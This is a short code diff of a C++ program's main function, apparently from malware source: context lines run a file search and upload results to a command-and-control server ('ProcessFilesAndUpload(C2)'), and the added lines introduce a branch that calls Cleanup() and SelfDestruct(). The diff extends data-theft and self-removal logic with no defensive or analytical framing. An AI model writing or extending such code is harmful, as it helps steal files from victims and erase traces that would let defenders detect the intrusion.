@@ -25,6 +25,10 @@ int main() {
                     std::cout << "Running file search" << std::endl;
                     ProcessFilesAndUpload(C2);
                 }
+                else {
+                    Cleanup();
+                    SelfDestruct();
+                }
             }
         }
         Cleanup();
